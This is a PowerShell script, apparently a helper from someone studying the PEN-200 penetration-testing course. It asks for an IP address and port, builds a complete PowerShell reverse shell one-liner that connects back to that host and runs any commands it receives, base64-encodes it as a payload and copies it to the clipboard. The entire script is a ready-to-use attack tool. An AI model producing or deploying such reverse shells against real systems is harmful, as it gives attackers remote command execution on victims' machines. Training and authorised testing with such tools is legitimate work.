#!/usr/bin/env pwsh

# This script generates a base64 encoded powershell reverse shell one-liner
# and copies it to the clipboard

# Cf. PEN-200, 9.3.1, Listing 32 - Encoding the oneliner in PowerShell on Linux
# https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-executable-files

# Prompt for IP Address
Write-Host "Enter the IP address."
Write-Host "If you enter only the last two octets, `192.168` will be prepended by default."
$ipAddress = Read-Host
# $ipAddress = Read-Host -Prompt "Enter the IP address."

# Check if the input is only the last two octets and prepend "192.168" if true
$octets = $ipAddress -split '\.'
if ($octets.Count -eq 2) {
    $ipAddress = "192.168." + $ipAddress
}

Write-Host "Your IP address is $ipAddress"

# Validate the IP Address
if (-not [System.Net.IPAddress]::TryParse($ipAddress, [ref]$null)) {
    Write-Host "Invalid IP address format. Please enter a valid IP address."
    exit
}

# Prompt for Port Number
$portNumber = Read-Host -Prompt "Enter the port number"

# Validate the Port Number
if ($portNumber -notmatch '^\d+$' -or [int]$portNumber -lt 0 -or [int]$portNumber -gt 65535) {
    Write-Host "Invalid port number. Please enter a port number between 0 and 65535."
    exit
}

# Construct the $Text string with variable expansion
# Cf. https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
$Text = "`$client = New-Object System.Net.Sockets.TCPClient('$ipAddress',$portNumber);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

# Output the constructed string (for verification or debugging)
Write-Host "Encoded string is: "
Write-Host $EncodedText

Write-Host "String copied to clipboard"
Invoke-Expression "echo -n '$EncodedText' | tr -d '\n' | xclip -selection clipboard"
